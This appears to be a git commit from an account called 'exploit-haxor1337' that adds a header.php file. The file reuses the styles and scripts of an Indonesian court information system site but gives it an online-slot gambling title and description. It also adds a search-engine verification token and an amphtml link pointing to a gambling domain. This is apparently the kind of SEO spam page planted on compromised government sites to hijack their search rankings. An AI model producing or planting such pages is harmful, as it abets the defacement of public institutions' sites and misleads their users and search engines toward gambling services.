71efa947be8e6d63d43dd1c6141271c006dd0f56
exploit-haxor1337 <76028485+exploit-haxor@users.noreply.github.com>
2024-10-13 21:10:18 +0700

    Add files via upload

---
+++ header.php
@@ -0,0 +1,20 @@
+<html>
+<head>
+	<link rel="shortcut icon" href="https://sipp.pa-argamakmur.go.id/resources/img/favicon.ico" type="image/png">
+	<title>SLOT THAILAND # LINK PENGHASIL SLOT GACOR MALAM INI MUDAH MAXWIN - SIPP</title>
+ 	<meta name="description" content="Slot Thailand memiliki update live RTP terupdate malam ini untuk permainan slot gacor yang mudah maxwin. Dapatkan fitur tambahan untuk jackpot maxwin dan nikmati pengalaman bermain slot online di server thailand resmi terbaru 2024." />
+ 
+	<meta name="google-site-verification" content="u1grUwBm2mHwx_Q3QzK9Ji9mI5p6wypKHTgSRvDXB_s" />
+	<link rel="amphtml" href="https://xn--2jst6fm6c29w.site/sthai/" />
+	<link rel="stylesheet" type="text/css" href="https://sipp.pa-argamakmur.go.id/resources/css/style.css">
+	<link rel="stylesheet" type="text/css" href="https://sipp.pa-argamakmur.go.id/resources/css/table.css">
+	<link rel="stylesheet" type="text/css" href="https://sipp.pa-argamakmur.go.id/resources/css/date-css.css" />
+	<link rel="stylesheet" type="text/css" href="https://sipp.pa-argamakmur.go.id/resources/css/simplePagination.css">
+	<script type="text/javascript" src="https://sipp.pa-argamakmur.go.id/resources/js/jquery-1.7.1.min.js"></script>
+	<script type="text/javascript" src="https://sipp.pa-argamakmur.go.id/resources/js/jquery-sipp.js"></script>
+	<script type="text/javascript" src="https://sipp.pa-argamakmur.go.id/resources/js/jquery-ui-1.8.18.custom.min.js"></script>
+	<script src="https://sipp.pa-argamakmur.go.id/resources/js/Modernizr.js"></script>
+	<script type="text/javascript" src="https://sipp.pa-argamakmur.go.id/resources/js/jquery.idTabs.min.js"></script>
+
+	<link rel="stylesheet" type="text/css" href="https://sipp.pa-argamakmur.go.id/resources/css/bootstrap.css">
+</head>
